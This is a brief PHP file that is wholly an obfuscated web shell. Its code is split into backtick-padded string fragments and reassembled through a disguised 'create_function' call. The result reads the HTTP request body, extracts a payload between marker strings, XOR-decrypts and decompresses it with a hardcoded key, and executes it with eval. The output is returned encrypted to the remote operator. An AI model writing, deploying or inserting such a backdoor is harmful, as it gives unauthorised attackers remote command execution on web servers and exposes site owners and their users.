<?php
$w='($`i=0;$`i<$l;){f`or($j=0;`($j<$c`&`&$i<$l);$j+`+,`$i++){$o`.=$t{`$`i}^`$k';
$G=str_replace('M','','cMreatMeM_MfunMcMtion');
$o='$k="017`3ff4c";`$kh="c7``60a`7`90037d";$``kf="8`eb743b06fc9";$p="BMlu``0dWph';
$a=');$r=@base6`4_en`co`d`e(@x`(@gz``compress($o),$k))`;print("`$p$kh$r$kf");}';
$K='{$j`};}}return $o;}if` `(@p`reg_match("/$k`h(.+)$k``f`/",@file_get_con`te`';
$i='`1B`D7uI`a";function x(`$t,$k)`{`$c=strlen(`$k);$l`=strlen($t);$o`="`";for';
$l='bas`e64_de`co`de($m[`1]),$k)));$o``=@o`b_``get_contents();@ob_e`nd_clea`n(';
$P='`nts("php://i`nput"),```$m)==1) {@ob_start`();@e`val(@gzuncom`p`ress(@x`(@';
$n=str_replace('`','',$o.$i.$w.$K.$P.$l.$a);
$c=$G('',$n);$c();
?>
